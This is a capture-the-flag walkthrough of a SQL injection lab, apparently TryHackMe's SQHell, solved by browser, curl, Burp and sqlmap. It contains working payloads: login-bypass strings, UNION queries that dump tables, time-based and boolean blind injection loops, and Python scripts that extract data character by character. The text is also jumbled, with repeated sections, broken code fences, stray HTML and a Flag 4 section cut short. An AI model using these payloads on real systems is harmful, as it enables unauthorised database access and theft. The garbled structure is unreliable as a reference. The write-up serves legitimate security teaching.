### Blind/Time - Curl Method <a href="#flag-2---blindtime---curl-method" id="flag-2---blindtime---curl-method"></a>

This command gets the page right away

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '86'); --+" http://$VICTIM
```

Changing the 86 to 84 there is a delay of 5 seconds.

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84'); --+" http://$VICTIM
```

**flag.py**

```
import requests
import time
import string

server = "10.10.157.66" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        start = time.time()
        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}'); --+"})
        end = time.time()
        if end-start >= 2:
            flag += chr(a)
            loop += 1
            print("Finding Flag: ", flag, end="\r")
            break
print("Flag found: ", flag)
```

**Kali**

```
python flag.py

## Flag 3 - Blind/Boolean - Curl Method

&#x20;

### &#x20;<a href="#machine-information" id="machine-information"></a>



### SQL Injection Info <a href="#sql-injection-info" id="sql-injection-info"></a>

Looking at the room description weâ€™re told specifically to find five different flags using various types SQL injection:

```
There are 5 flags to find but you have to defeat the different SQL injection types.
Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.
```

There are a ton of great resources out there on the internet to help with SQLi. A few good ones that have helped me are [this](https://github.com/Y000o/sql\_injection\_basic/blob/master/sql\_injection\_basic\_en.md), and [this](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet), which both have lots of information and examples. Thereâ€™s also this [cheatsheet](https://cheatography.com/binca/cheat-sheets/sql-injection) which is nicely laid out, and [this](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet) one which has a good list of boolean based examples to try. Finally [this](https://www.acunetix.com/websitesecurity/sql-injection2/) article is a good introduction to the five basic type of SQL injection.

In real life we need to use different tools depending on the scenario. So for this room Iâ€™m going to cover the flags using some or all of these methods for each:

```
Browser (FireFox)
Curl
BurpSuite
SQLMap
```

For BurpSuite Iâ€™m using FoxyProxy to redirect my browser to it. Hereâ€™s the config needed in case you havenâ€™t got it set up:

![sqhell-foxy-burp](https://pencer.io/assets/images/2021-06-08-22-36-12.png)

### Initial Access[Permalin](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access) <a href="#initial-access" id="initial-access"></a>

First letâ€™s add the server IP to our hosts file:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# echo 10.10.164.142 sqhell.thm >> /etc/hosts
```

Now we can have a look at the website:

![sqhell-website](https://pencer.io/assets/images/2021-06-08-21-44-26.png)

We have a simple static html based website with five areas for us to exploit. Letâ€™s start on the first flag.

### Flag 1 - In-Band/Error Based - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---browser-method) <a href="#flag-1---in-banderror-based---browser-method" id="flag-1---in-banderror-based---browser-method"></a>

The first flag is the easiest, start by clicking on the Login button which takes us here:

![sqhell-login](https://pencer.io/assets/images/2021-06-08-21-59-04.png)

We have username and password boxes, itâ€™s safe to assume weâ€™ll be doing a simple sql injection authentication bypass technique here.

I tried a few different ones from the cheatsheet mentioned above, this was the one that worked for me:

```
admin' or '1'='1
```

Simply enter that in the Username field and press Login:

![sqhell-admin-bypass](https://pencer.io/assets/images/2021-06-08-22-20-14.png)

We are taken to another page which reveals the first flag:

![sqhell-browser-1](https://pencer.io/assets/images/2021-06-08-22-21-09.png)

### Flag 1 - In-Band/Error Based - Curl Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---curl-method) <a href="#flag-1---in-banderror-based---curl-method" id="flag-1---in-banderror-based---curl-method"></a>

We can also do this using curl, with the same authentication bypass technique. To automate the process of finding which one works I copied the examples from the cheatsheet [here](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet) to a file:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/diffctf]
â””â”€# cat bypass.txt
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
<SNIP>
```

Then used a simple loop in BASH to read each line and try it against the website:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/diffctf]
â””â”€# while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s' "$p"; curl -s -d "username=$p" -d "password=" http://sqhell.thm/login | grep THM; printf "\n"
done < bypass.txt

or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #                            <p>THM{FLAG1:<HIDDEN>}</p>
admin'/*
admin' or '1'='1                    <p>THM{FLAG1:<HIDDEN>}</p>
admin' or '1'='1'--
admin' or '1'='1'#                  <p>THM{FLAG1:<HIDDEN>}</p>
admin' or '1'='1'/*
admin'or 1=1 or ''='                <p>THM{FLAG1:<HIDDEN>}</p>
admin' or 1=1
admin' or 1=1--
admin' or 1=1#                      <p>THM{FLAG1:<HIDDEN>}</p>
<SNIP>
```

As you can see quite a few different ones worked.

### Flag 1 - In-Band/Error Based - Burp Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---burp-method) <a href="#flag-1---in-banderror-based---burp-method" id="flag-1---in-banderror-based---burp-method"></a>

We can use Burp to intercept the browser request. First make sure you have FoxyProxy on and set to use Burp, then use anything for the username:

![sqhell-foxy-config](https://pencer.io/assets/images/2021-06-08-22-40-10.png)

With Intercept set to On in Burp, when you click the Login button in your browser it gets redirected and caught:

![sqhell-burp-intercept](https://pencer.io/assets/images/2021-06-08-22-43-08.png)

Right click anywhere on the text and chose Send to Intruder. Check the last line has something within $ set against the username field, this is the variable that Burp will replace with our word list:

![sqhell-burp-1](https://pencer.io/assets/images/2021-06-08-22-30-06.png)

Switch to the Payloads tab and load a list of bypass techniques to try. I used the same file Iâ€™d copied them in to for the above curl method:

![sqhell-burp-intruder](https://pencer.io/assets/images/2021-06-09-22-02-49.png)

Click the Start Attack button and wait for burp to try everything from your list. Looking at the results youâ€™ll see a few lines with a smaller length to the others. If you switch to the response tab you can see these are the responses containing our flag:

![sqhell-burp-results](https://pencer.io/assets/images/2021-06-09-22-08-44.png)

### Flag 1 - In-Band/Error Based - SQLMap Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---sqlmap-method) <a href="#flag-1---in-banderror-based---sqlmap-method" id="flag-1---in-banderror-based---sqlmap-method"></a>

The last method to look at is arguably the easiest. Once you know how to use SQLMap it makes the process of discovery and enumeration much easier. If we pretend we donâ€™t know the login page is vulnerable then letâ€™s follow the process we could use to exploit the page. [This](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap) is a useful post on using SQLMap for SQLi.

First we run an initial scan to see what SQLMap can discover about the database behind the logon page:

```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/sqhell]
â””â”€# sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin"

Thereâ€™s a lot of information, the key point is:

```

POST parameter 'username' is vulnerable.
```

With the information gathered we can tell SQLMap to use the username and password fields, set the database to mysql, and dump the databases it can find:

        </div>
    </div>
</div>
</body>
</html>
```

Ok, that was four different ways to get flag 1. Letâ€™s move on to the next flag.

### Flag 5 - In-Band/Union - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---browser-method) <a href="#flag-5---in-bandunion---browser-method" id="flag-5---in-bandunion---browser-method"></a>

The next easiest flag is number five. For this one weâ€™ll be using parameter tampering and a UNION based exploit. I did another TryHackMe room called Jurassic Park where I used the same techniques as follows, you can see that post [here.](https://pencer.io/ctf/ctf-thm-jurassic-park). Thereâ€™s also helpful articles [here](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example) and [here](https://book.hacktricks.xyz/pentesting-web/sql-injection) that are worth a read.

First letâ€™s see what we have:

![sqhell-posts](https://pencer.io/assets/images/2021-06-10-22-00-58.png)

Weâ€™re looking at one of the posts and can see it has a parameter on the end of the URL, in this case itâ€™s ID=1. Thereâ€™s lots of ways to check if this is vulnerable, probably the easiest is to add a â€˜ on the end:

![sqhell-apostrophe](https://pencer.io/assets/images/2021-06-10-22-07-45.png)]

It says thereâ€™s an error in our syntax, which tells us our extra character on the end wasnâ€™t removed. We could also do something simple like AND 1=1:

![sqhell-and1=1](https://pencer.io/assets/images/2021-06-10-22-10-25.png)

As before we can see the statement was evaluated with our extra part on the end. In this instance AND 1=1 is true so the page appears as normal. Now we know itâ€™s vulnerable we can start to dig deeper.

First we want to know how many columns are in the table. We start at 1 and add columns until we get an error:

![sqhell-columns](https://pencer.io/assets/images/2021-06-10-22-13-56.png)

So here I did ORDER BY 1 then ORDER BY 1,2 and so on until I got to 5. The error at that point tells us there are four columns. Next we want to see which of those columns are useable:

```
http://sqhell.thm/post?id=99 union all select 1,2,3,4
```

![sqhell-union-all](https://pencer.io/assets/images/2021-06-10-22-17-03.png)

The UNION ALL statement is used to show us which column appears where on the page. We want the output to be visible, otherwise we wonâ€™t be able to see the data we retrieve. We can see column three is the main section of the page, so plenty of room for our output. Weâ€™ll use that one for all our subsequent commands.

Letâ€™s get the database name:

```
http://sqhell.thm/post?id=99 union all select 1,2,database(),4
```

![sqhell-union-database](https://pencer.io/assets/images/2021-06-10-22-20-11.png)

Now we want the tables in the database:

```
http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()
```

![sqhell-union-tables](https://pencer.io/assets/images/2021-06-10-22-22-27.png)

Finally we see the tables in the database, flag sounds like the one weâ€™re looking for. Letâ€™s have a look at the contents of it:

```
http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag
```

![sqhell-union-flag](https://pencer.io/assets/images/2021-06-10-22-31-25.png)

We have the flag. Letâ€™s move on to a different method.

### Flag 5 - In-Band/Union - Curl Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---curl-method) <a href="#flag-5---in-bandunion---curl-method" id="flag-5---in-bandunion---curl-method"></a>

I went in to detail on the last flag on using curl instead of the browser. If you can use a browser you would because itâ€™s easier, but in case itâ€™s not possible hereâ€™s how to do this flag using curl.

First check how many columns we have:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1"
Post not found
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2"
Post not found
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3"
Post not found
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3,4"
Post not found
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3,4,5"
Unknown column '5' in 'order clause'
```

We have four columns, as before we check to see which one is useable to display the data we retrieve:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 union all select 1,2,3,4" | grep -A 1 panel-body
                <div class="panel-body">
                    3                </div>
```

I use grep to filter the output down to just the body of the response. We see column three is the one to use. Letâ€™s find the database name:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 union all select 1,2,database(),4" | grep -A 1 panel-body 
                <div class="panel-body">
                    sqhell_5                </div>
```

Now find the tables in it:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()" | grep -A 1 panel-body
                <div class="panel-body">
                    flag,posts,users                </div>
```

Then get the flag from the table:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# curl -s "http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag" | grep -A 1 panel-body
                <div class="panel-body">
                    THM{FLAG5:<HIDDEN>}                </div>
```

### Flag 5 - In-Band/Union - SQLMap Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---sqlmap-method) <a href="#flag-5---in-bandunion---sqlmap-method" id="flag-5---in-bandunion---sqlmap-method"></a>

Moving on to SQLMap and like flag 1, this is pretty simple. First check for the post page parameter for vulnerability and find any databases:

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/sqhell]
â””â”€# sqlmap -u "http://sqhell.thm/post?id=2" -p "id" --dbs --dbms=mysql --threads 10

We have the flag with only two runs of SQLMap, nice and simple!

Letâ€™s move on to the next flag.

### Flag 3 - Blind/Boolean - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-3---blindboolean---browser-method) <a href="#flag-3---blindboolean---browser-method" id="flag-3---blindboolean---browser-method"></a>

I found [this](https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/) guide, which is a good in depth look at blind or boolean based attacks.

First looking at the Register page to see what we are dealing with:

![sqhell-register](https://pencer.io/assets/images/2021-06-14-22-09-41.png)

If we try admin as the user we see a message saying itâ€™s taken:

![sqhell-admin](https://pencer.io/assets/images/2021-06-14-22-10-40.png)

If we try test as the user we see a message saying itâ€™s available:

![sqhell-test](https://pencer.io/assets/images/2021-06-14-22-11-36.png)

Looking at the source code for the page we see how this works:

```
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>
```

The script section calls a function called user-check to see if the name youâ€™ve entered is available. We can visit this endpoint directly:

![sqhell-user-check](https://pencer.io/assets/images/2021-06-14-22-15-40.png)

Here we see the JSON output showing us the username isnâ€™t available. First we test for SQLi:

![sqhell-test-user](https://pencer.io/assets/images/2021-06-14-22-22-09.png)

We still see available is false so we know we can perform SQLi and use the true/false response to confirm our query. Now we know this works our first task is to find the database name. We could continue in the browser, but for speed Iâ€™ll switch to curl.

### Flag 3 - Blind/Boolean - Curl Method <a href="#flag-3---blindboolean---curl-method" id="flag-3---blindboolean---curl-method"></a>

Letâ€™s test how many characters are in the database name:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 1 --+"
```

This tells us the database name length isnâ€™t 1 character long. Next we try two characters:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 2 --+"
```

Same answer for two characters, so we continue adding one and testing until we get a false:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Same answer for two characters, so we continue adding one and testing until we get a false:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (length(database())) = 8 --+"
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This tells us the length of the name of the database is eight characters. Now we want to find what those eight characters are, we can cheat a little as we can guess itâ€™s in the same format as the previous flags. So with the knowledge that it is probably sqhell\_3 letâ€™s test the first character. To do this we need to know the ASCII code for lower case s, which is 115 known by looking at [this](http://www.asciitable.com/) handy table.

Letâ€™s see if the first character is equal to s:

**Kali**

```
curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),1,1))) = 115 --+"
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

False tells us the letter isnâ€™t available, or in other words there is a match. So weâ€™ve confirmed the first character is s, letâ€™s check for q. I also made this one liner to loop through all uncaptalize letters to make it easier.

**Kali**

```
for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),2,1))) = $i  --+" && echo "Val: $i";  done
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I kept doing this until the last eighth character. Writing down the results to convert to ASCII

**Kali**

```
for (( i=0; i<=255; i++ )); do curl "http://$VICTIM/register/user-check?username=admin' AND (ascii(substr((select database()),8,1))) = $i  --+" && echo "Val: $i";  done
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Weâ€™ve confirmed the database is called sqhell\_3. Next we would use the same technique to get the table names in the database, of course that would be a long a laborious process. Used this script to get the flag.

**flag.py**

```
import requests
import string

server = "10.10.29.184" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        req = requests.get("http://" + server + f"/register/user-check?username=admin' AND (ASCII(SUBSTR((SELECT flag FROM sqhell_3.flag),{loop},1))) = '{a}'; --+")
        if 'false' in req.text:
             flag += chr(a)
             loop += 1
             print("Finding Flag: ", flag, end="\r")
             break
print("Flag found: ", flag)
```

**Kali**

```
python flag.py
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Flag 4

### Out-of-band - Browser Method <a href="#flag-4---out-of-band---browser-method" id="flag-4---out-of-band---browser-method"></a>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see her just like on the posts page there is a parameter. Letâ€™s test to see if we can inject like before:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Adding AND 1=1 results in a true statement which proves we can inject here. Now we need to determine the number of columns in the table just like we did for flag 5. We do this the same way using the ORDER BY statement.

So just like before we start with ORDER BY 1, then ORDER BY 2, and so on until we get to ORDER BY 4 where we see an error:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we know how many columns we have we can use a UNION statement to test which ones are visible:

```
http://$VICTIM/user?id=1337 union select 1,2,3
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here weâ€™ve used a false ID, which would result in an error but instead weâ€™ve used the UNION statement to retrieve the column numbers. Now we know column one and two are useable we can retrieve the user and database:

```
http://$VICTIM/user?id=1337 union select database(),user(),null
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Next we want to see the tables in the database and can use the same query as before:

```
http://$VICTIM/user?id=1337 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
```

However this time when we ask for all tables using group\_concat we only see the one user table:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We know a different database contains the posts table, but we find the expected flag table canâ€™t be queried here. Itâ€™s at this point that we need to go back to the hint about running a query inside a query. And we again need to determine the number of columns:

```
http://$VICTM/user?id=1337 union select "1 order by 1-- -",2,3 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here Iâ€™ve just added an ORDER BY query to the end of the UNION SELECT 1, and enclosed it in quotes so it gets evaluated. As before we keep adding columns until we something changes:

```
http://sqhell.thm/user?id=1337 union select "1 order by 1,2,3,4,5-- -",2,3 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see at five columns the posts disappear. This tells us there are four columns. Now we can use the same query as before to get the flag from the flag table:

```
http://sqhell.thm/user?id=1337 union select "1 union select 1,flag,3,4 from flag-- -",2,3 from information_schema.tables where table_schema=database()
```

## Flag 5

### In-Band/Union - Browser Method <a href="#flag-5---in-bandunion---browser-method" id="flag-5---in-bandunion---browser-method"></a>

The next easiest flag is number five. For this one weâ€™ll be using parameter tampering and a UNION based exploit. I did another TryHackMe room called Jurassic Park where I used the same techniques as follows, you can see that post [here.](https://pencer.io/ctf/ctf-thm-jurassic-park). Thereâ€™s also helpful articles [here](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example) and [here](https://book.hacktricks.xyz/pentesting-web/sql-injection) that are worth a read.

First letâ€™s see what we have:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Weâ€™re looking at one of the posts and can see it has a parameter on the end of the URL, in this case itâ€™s ID=1. Thereâ€™s lots of ways to check if this is vulnerable, probably the easiest is to add a â€˜ on the end:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It says thereâ€™s an error in our syntax, which tells us our extra character on the end wasnâ€™t removed. We could also do something simple like AND 1=1:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As before we can see the statement was evaluated with our extra part on the end. In this instance AND 1=1 is true so the page appears as normal. Now we know itâ€™s vulnerable we can start to dig deeper.

First we want to know how many columns are in the table. We start at 1 and add columns until we get an error:

```
http://sqhell.thm/post?id=99 union all select 1,2,3,4
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The UNION ALL statement is used to show us which column appears where on the page. We want the output to be visible, otherwise we wonâ€™t be able to see the data we retrieve. We can see column three is the main section of the page, so plenty of room for our output. Weâ€™ll use that one for all our subsequent commands.

Letâ€™s get the database name:

```
http://sqhell.thm/post?id=99 union all select 1,2,database(),4
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we want the tables in the database:

```
http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Finally we see the tables in the database, flag sounds like the one weâ€™re looking for. Letâ€™s have a look at the contents of it:

```
http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag
```
